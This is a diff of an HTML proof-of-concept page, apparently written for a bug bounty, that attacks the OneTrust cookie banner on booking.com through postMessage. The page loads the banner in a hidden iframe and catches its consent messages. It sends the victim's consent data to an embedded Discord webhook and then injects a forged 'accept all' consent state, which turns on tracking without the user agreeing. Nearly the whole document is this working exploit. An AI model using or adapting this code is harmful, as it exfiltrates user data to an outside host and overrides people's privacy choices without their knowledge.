@@ -1,51 +1,40 @@
 <!DOCTYPE html>
 <html>
+<head><title>Impact PoC</title></head>
 <body>
-    <iframe id="target" src="https://www.booking.com/cookiebanner.html" style="display:none;"></iframe>
+    <iframe id="victimFrame" src="https://www.booking.com/cookiebanner.html" style="display:none;"></iframe>
 
     <script>
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482769233833361579/wlvMp6ttCaKnu369UitCSckNmYYKVGxn0JGsLDuhIhYg0XgoLlfAZWWr04JcWq4b2hOu';
-        const targetFrame = document.getElementById('target');
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1482769233833361579/wlvMp6ttCaKnu369UitCSckNmYYKVGxn0JGsLDuhIhYg0XgoLlfAZWWr04JcWq4b2hOu";
+        const frame = document.getElementById('victimFrame');
 
         window.onmessage = function(e) {
-            // Check if the message is the OneTrust payload
+            // Check if the message is from the OneTrust sync script
             if (e.data && e.data.name === "OneTrustCookies") {
                 
-                const stolenData = {
-                    content: "🚨 **Vulnerability PoC: PostMessage Leak**",
-                    embeds: [{
-                        title: "Intercepted Consent Data",
-                        color: 15158332, // Red
-                        fields: [
-                            { name: "Consent String", value: "`" + e.data.OptanonConsent + "`" },
-                            { name: "Alert Closed", value: e.data.OptanonAlertBoxClosed, inline: true },
-                            { name: "Origin", value: window.location.href, inline: true }
-                        ],
-                        footer: { text: "Bug Bounty Demonstration Only" },
-                        timestamp: new Date().toISOString()
-                    }]
+                // 1. EXFILTRATION: Send current cookies to Discord
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        username: "PostMessage Stalker",
+                        content: "⚠️ **Privacy Bypass Detected**\n**Stolen Consent:** `" + e.data.OptanonConsent + "`"
+                    })
+                });
+
+                // 2. INJECTION: Force 'Full Consent' state
+                // This payload tells OneTrust that the user has accepted all categories (C0001-C0004)
+                const impactPayload = {
+                    OptanonConsent: "isIABGlobal=false&datestamp=Sun+Mar+15+2026&groups=C0001:1,C0002:1,C0003:1,C0004:1",
+                    OptanonAlertBoxClosed: new Date().toISOString()
                 };
 
-                // Send to Discord
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(stolenData)
-                }).then(() => {
-                    console.log("Impact demonstrated: Data sent to webhook.");
-                    // After leaking, we can also poison the cookie
-                    inject();
-                });
+                frame.contentWindow.postMessage(impactPayload, "*");
+                
+                // 3. UI PROOF: Show the hunter that the injection worked
+                alert("IMPACT DEMONSTRATED:\n1. Data sent to Discord.\n2. Cookies poisoned to 'Full Opt-In'.\n3. Refresh the target site; the banner will be gone and tracking enabled.");
             }
         };
-
-        function inject() {
-            const poison = {
-                OptanonConsent: "groups=C0001:1,C0002:1,C0003:1,C0004:1",
-                OptanonAlertBoxClosed: "true"
-            };
-            targetFrame.contentWindow.postMessage(poison, "*");
-        }
     </script>
 </body>
 </html>
